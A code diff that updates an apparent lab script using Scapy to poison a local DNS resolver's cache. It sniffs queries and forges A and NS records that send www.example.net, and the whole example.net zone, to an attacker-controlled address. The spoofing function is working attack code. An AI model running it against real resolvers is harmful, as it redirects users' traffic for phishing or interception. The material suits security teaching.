@@ -3,14 +3,36 @@
 Sniff UDP query packets from local DNS server and invoke spoof_dns().
 """
 
-from scapy.all import DNS, IP, sniff, UDP, DNSRR, send
-IFACE = 'br-5ac257e6b33f'  # FIXME : Change this to 10.9.0.1 network interface
+from scapy.all import DNS, IP, sniff, UDP, DNSRR, send, get_if_addr, get_if_list
 
-# Poison the cache of local DNS server to resolve www.example.net to
+
+def find_iface(bridge_ip='10.9.0.1'):
+    """Auto-detect the host bridge interface for the 10.9.0.0/24 lab network.
+
+    The attacker runs with network_mode: host, so it sees the Docker bridge
+    (br-<id>) that backs net-10.9.0.0. The bridge's own address is 10.9.0.1,
+    so we locate the interface by that address instead of hard-coding a
+    br-<id> name (which changes every time the network is recreated).
+    """
+    for iface in get_if_list():
+        try:
+            if get_if_addr(iface) == bridge_ip:
+                return iface
+        except Exception:
+            continue
+    raise SystemExit(
+        f"Could not find the interface for {bridge_ip}. Is the lab running, "
+        "and is this container started with network_mode: host?")
+
+
+IFACE = find_iface()
+
+# Poison the cache of the local DNS server so www.example.net resolves to
+# the attacker-chosen address below (instead of the real 93.184.216.34).
 FILTER = 'udp and src host 10.9.0.53 and dst port 53'
 DOMAIN = 'www.example.net'
-# Pick an IP address to which the DNS response should be spoofed
-SPOOFED_IP = '142.250.189.238'  # Google IP address
+# Attacker-controlled address the victim will be sent to.
+SPOOFED_IP = '192.168.0.100'  # attacker-controlled host
 
 
 def spoof_dns(pkt):
@@ -31,7 +53,15 @@ def spoof_dns(pkt):
             Ans_sec = DNSRR(rrname=pkt[DNS].qd.qname, type='A',
                             rdata=SPOOFED_IP, ttl=259200)
 
-            # The Authority Section
+            # The Authority Section.
+            # NOTE: this NS record attempts the full-domain (Kaminsky) hijack,
+            # pointing the whole example.net zone at the attacker's name
+            # server. The victim resolver only acts on it when it resolves
+            # example.net ITERATIVELY. In this self-contained lab example.net
+            # is a forward zone, so the resolver forwards every query to the
+            # legit server and ignores this record -- only the A record above
+            # is cached (per-name poisoning). Build a lab root/TLD (iterative
+            # resolution) to demonstrate the NS hijack as well.
             NS_sec = DNSRR(rrname=DOMAIN, type='NS',
                            rdata='ns.attacker32.com', ttl=259200)
 
